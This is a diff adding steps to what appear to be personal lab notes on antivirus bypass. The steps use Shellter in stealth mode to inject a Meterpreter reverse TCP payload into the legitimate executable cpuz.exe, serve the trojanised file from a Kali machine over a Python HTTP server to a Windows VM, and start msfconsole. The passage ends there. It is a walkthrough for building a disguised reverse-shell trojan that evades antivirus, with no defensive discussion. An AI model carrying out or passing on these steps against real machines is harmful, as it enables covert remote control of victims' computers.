@@ -24,5 +24,31 @@ ls
 sudo shellter
 A (automatic)
 PE target: /home/kali/Desktop/av-bypass/cpuz.exe
+Enable stealth mode: Y
+Use a listed payload or custom? : L
+Choose Meterpreter_Reverse_TCP
+SET LHOSTS: (ifconfig to check on kali)
+SET LPORT: 4321 (remember the port and you can add any port you like, this one is just for example)
+...
+Injection : Verified!
+
+```
+
+Sharing the file using the HTTP server:
+```
+(its possible only because both the VMs are on the same NAT network)
+(On kali)
+`python -m http.server 8080` 
+
+(On Windows)
+the IP of kali machine followed by the port no. on the windows browser. 
+**192.168.15.8:8080** 
+navigate the injected file on the server
+```
+
+Using Metasploit:
+```
+(On kali)
+msfconsole
 
 ```
